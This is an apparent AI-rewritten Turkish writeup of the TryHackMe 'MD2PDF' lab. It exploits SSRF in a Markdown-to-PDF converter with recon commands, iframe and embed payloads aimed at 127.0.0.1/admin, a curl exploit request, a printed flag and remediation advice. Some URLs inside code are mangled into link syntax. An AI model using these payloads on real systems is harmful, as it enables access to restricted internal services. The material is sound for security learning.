Harika bir writeup daha! İçeriği inceledim; teknik akış, SSRF (Server-Side Request Forgery) mantığı ve çözüm adımları tamamen doğru. Özellikle PDF render motorlarının iç ağdaki servisleri (localhost) çağırma zafiyetini çok net açıklamışsın.

**Küçük bir düzeltme/not:** Bazı makinelerde `/admin` paneli doğrudan `80` portunda değil, `5000` gibi farklı bir iç portta çalışabiliyor. Writeup'ında hem `[http://127.0.0.1/admin](http://127.0.0.1/admin)` hem de `[http://127.0.0.1:5000/admin](http://127.0.0.1:5000/admin)` ifadelerini kullanmışsın, bu kafa karıştırmaması için aşağıda tutarlı hale getirdim.

İşte **MD2PDF** çözümünün profesyonel Türkçe versiyonu:

---

# 📄 MD2PDF — TryHackMe Çözüm Raporu (Writeup)

> **Yazar:** Miraç Akkuş (LatenT)
> **Tarih:** Mayıs 2026
> **Oda:** [MD2PDF]()

---

## 📋 Özet

Bu rapor, **MD2PDF** makinesinin çözüm sürecini dökümante eder. Saldırı, bir Markdown-PDF dönüştürücü uygulamasındaki **Server-Side Request Forgery (SSRF)** zafiyetini temel alır. Saldırı zinciri; Markdown girdisi içine HTML enjeksiyonu yaparak, sunucu tarafındaki PDF oluşturma motorunun IP tabanlı erişim kontrollerini aşmasını ve kısıtlanmış yönetim paneline erişmesini sağlar.

---

## 🛠️ Araçlar ve Teknolojiler

| Araç | Kullanım Amacı |
| --- | --- |
| `nmap` | Ağ keşfi ve servis taraması |
| `gobuster` | Dizin ve dosya taraması |
| `curl` | HTTP istek testi ve exploit gönderimi |
| `pdftotext` | PDF içeriğini metne dönüştürme |
| `strings` | İkili dosyalardan anlamlı veri ayıklama |

---

## 🔍 Aşama 1: Keşif ve Bilgi Toplama

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>

```

**Bulgular:**

| Port | Durum | Servis | Notlar |
| --- | --- | --- | --- |
| 22/tcp | Açık | SSH | Standart erişim yolu |
| 80/tcp | Açık | HTTP | MD2PDF web uygulaması |

### Dizin Taraması

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirb/common.txt

```

**Keşif:** `/admin` dizini tespit edildi ancak **403 Forbidden** (Erişim Engellendi) hatası döndürüyor.
**Hata Mesajı:** "Only accessible from 127.0.0.1" (Sadece yerel makineden erişilebilir).
**Analiz:** Yönetim paneli IP kısıtlamasına sahip. Bu durum, sunucunun kendisi üzerinden yapılacak bir isteğin (SSRF) bu engeli aşabileceğini gösterir.

---

## 🌐 Aşama 2: Web Uygulama Analizi

### Uygulama İşleyişi

Uygulama, kullanıcıdan Markdown girdisi alıyor ve bir PDF dosyası oluşturuyor.

**Normal Akış:**

1. Kullanıcı Markdown metnini form üzerinden gönderir.
2. Sunucu bu girdiyi bir Markdown ayrıştırıcıdan geçirir.
3. PDF oluşturma motoru (render engine) HTML içeriği işler.
4. Oluşturulan PDF kullanıcıya indirilir.

### HTML Enjeksiyon Testi

Markdown içinde ham HTML kodlarının işlenip işlenmediğini test ettim:

```markdown
<h1>Test</h1><p style="color:red">HTML injection calisiyor!</p>

```

**Sonuç:** HTML etiketleri PDF içinde başarıyla işlendi. Sunucu tarafında girdi temizleme (sanitization) yapılmadığı doğrulandı.

---

## 🎯 Aşama 3: SSRF İstismarı

### Zafiyet Teorisi

PDF oluşturma motorları (wkhtmltopdf, WeasyPrint vb.), dış kaynakları (resimler, stil dosyaları, iframe'ler) sunucu üzerinden istek atarak çeker. Eğer Markdown içine bir `iframe` enjekte edersek, istek sunucunun kendi IP'si (`127.0.0.1`) üzerinden gideceği için `/admin` panelindeki IP kısıtlaması atlatılmış olur.

### Payload (Saldırı Kodu) Hazırlığı

**Ana Vektör — Iframe Enjeksiyonu:**

```html
<iframe src="http://127.0.0.1/admin" width="1000" height="1000"></iframe>

```

**Alternatif Vektörler:**

| Vektör | Payload | Durum |
| --- | --- | --- |
| Image | `![admin](http://127.0.0.1/admin)` | Temel SSRF kontrolü |
| Object | `<object data="[http://127.0.0.1/admin](http://127.0.0.1/admin)"></object>` | Alternatif gömme |
| Embed | `<embed src="[http://127.0.0.1/admin](http://127.0.0.1/admin)">` | Yedek vektör |

---

## 🐚 Aşama 4: Bayrak (Flag) Çıkarma

### İstismar ve PDF İndirme

```bash
curl -X POST http://<HEDEF_IP>/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "md=<iframe src=\"http://127.0.0.1/admin\" width=\"1000\" height=\"1000\"></iframe>" \
  -o cikti.pdf

```

### PDF İçeriğini Okuma

Oluşturulan PDF, sunucunun kendi içindeki `/admin` panelini render etmiş halini içerir.

```bash
# Metin çıkarma
pdftotext cikti.pdf cikti.txt

# Flag arama
strings cikti.pdf | grep -i "THM{"

```

**Sonuç:** PDF içerisinde yönetim panelinin görüntüsü ve dolayısıyla flag başarıyla elde edildi.
**FLAG:** flag{1f4a2b6ffeaf4707c43885d704eaee4b}

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözüm Önerileri

| # | Zafiyet | Şiddet | Çözüm |
| --- | --- | --- | --- |
| 1 | **Server-Side Request Forgery (SSRF)** | 🔴 Kritik | URL beyaz listesi (allowlist) uygulayın; iç IP adreslerini (127.0.0.1, 10.0.0.0/8 vb.) engelleyin. |
| 2 | **Markdown İçinde HTML Enjeksiyonu** | 🟠 Yüksek | Markdown girdisini temizleyin; ham HTML render edilmesini devre dışı bırakın. |
| 3 | **IP Tabanlı Erişim Kontrolü** | 🟠 Yüksek | Sadece IP'ye güvenmeyin; güçlü bir kimlik doğrulama (token/şifre) sistemi kullanın. |
| 4 | **Kısıtlanmamış PDF Oluşturma** | 🟡 Orta | PDF oluşturma işlemini sandbox (kum havuzu) içinde çalıştırın ve dış kaynak erişimini kısıtlayın. |

---

## 🎓 Önemli Çıkarımlar

1. **PDF Motorları ve SSRF:** Sunucu taraflı PDF motorları dış kaynakları çekerken sunucu gibi davranır, bu da SSRF için mükemmel bir vektördür.
2. **localhost Güvende Değildir:** Bir servisin sadece 127.0.0.1'e açık olması, SSRF zafiyeti olan bir sunucuda o servisin korunmasız olduğu anlamına gelir.
3. **Varsayılan Ayarlar:** Birçok Markdown kütüphanesi varsayılan olarak HTML kabul eder; bu özellik güvenlik için kapatılmalıdır.

---

> **⚠️ Yasal Uyarı:** Bu rapor yalnızca eğitim amaçlıdır. Yetkisiz sistemlere saldırmak yasal suçtur. Her zaman izin alarak test yapın.

---

**Yazar:** Miraç Akkuş (LatenT)

**Tarih:** Mayıs 2026
